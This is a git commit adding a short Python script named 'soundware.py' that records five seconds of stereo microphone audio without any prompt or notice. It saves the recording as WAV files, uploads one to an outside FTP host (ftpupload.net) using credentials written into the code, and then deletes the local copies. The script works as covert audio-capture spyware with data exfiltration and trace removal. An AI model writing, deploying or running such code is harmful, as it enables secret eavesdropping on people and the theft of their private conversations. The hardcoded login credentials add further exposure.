49dd0b937e497a3e76fcb0fb5e68a9f10b938245
Luka Miletic <112261868+mileticluka1@users.noreply.github.com>
2022-10-31 14:59:24 -0700

    Create soundware.py

---
+++ soundware.py
@@ -0,0 +1,26 @@
+import os
+import sounddevice as sd
+from scipy.io.wavfile import write
+import wavio as wv
+import ftplib
+  
+freq = 44100
+
+duration = 5
+
+recording = sd.rec(int(duration * freq), 
+                   samplerate=freq, channels=2)
+sd.wait()
+
+write("recording0.wav", freq, recording)
+
+wv.write("recording1.wav", recording, freq, sampwidth=2)
+
+session = ftplib.FTP('ftpupload.net','eb2a_32851376','portablemachine')
+file = open('recording1.wav','rb')
+session.storbinary('STOR recording1.wav', file)
+file.close()
+session.quit()
+
+os.remove("recording0.wav")
+os.remove("recording1.wav")
